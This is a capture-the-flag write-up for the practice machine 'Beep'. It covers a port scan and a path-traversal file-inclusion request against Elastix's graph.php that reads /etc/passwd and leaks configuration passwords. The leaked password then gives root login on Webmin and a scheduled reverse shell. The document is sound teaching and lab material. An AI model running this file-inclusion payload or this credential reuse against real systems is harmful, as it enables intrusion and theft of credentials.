# Beep

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.1.226 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 22:53 EDT
Nmap scan report for 10.129.1.226
Host is up (0.0079s latency).
Not shown: 65519 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
941/tcp   open  unknown
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4190/tcp  open  sieve
4445/tcp  open  upnotifyp
4559/tcp  open  hylafax
5038/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt
```

Lots of ports open. We can start with the HTTP ports.

### Elastix

Port 443 has an Elastix instance:

<figure><img src="../../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

Elastix has a ton of exploits:

```
$ searchsploit elastix          
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                      | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities    | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilit | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion           | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                          | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                         | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution     | php/webapps/18650.py
```

Using the LFI exploit, we can confirm that it works by viewing `/etc/passwd`.&#x20;

```
$ curl -k 'https://10.129.1.226/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action' 
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
distcache:x:94:94:Distcache:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
dbus:x:81:81:System message bus:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
spamfilter:x:500:500::/home/spamfilter:/bin/bash
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
fanis:x:501:501::/home/fanis:/bin/bash
```

The exploit loads `/etc/amportal.conf` by default, and when viewed, we can find a few passwords:

```
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```

We'll keep this for now.

### Webmin

Using `jEhdIekWmdjE`, we can login as `root` on Webmin on port 10000.&#x20;

<figure><img src="../../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

With access to Webmin, we actually already have full control over the machine. As such, we can create a scheduled command that would give us a reverse shell.

<figure><img src="../../../.gitbook/assets/image (152) (5).png" alt=""><figcaption></figcaption></figure>

We would then catch a reverse shell after waiting a minute.&#x20;

<figure><img src="../../../.gitbook/assets/image (157) (6).png" alt=""><figcaption></figcaption></figure>

Rooted!
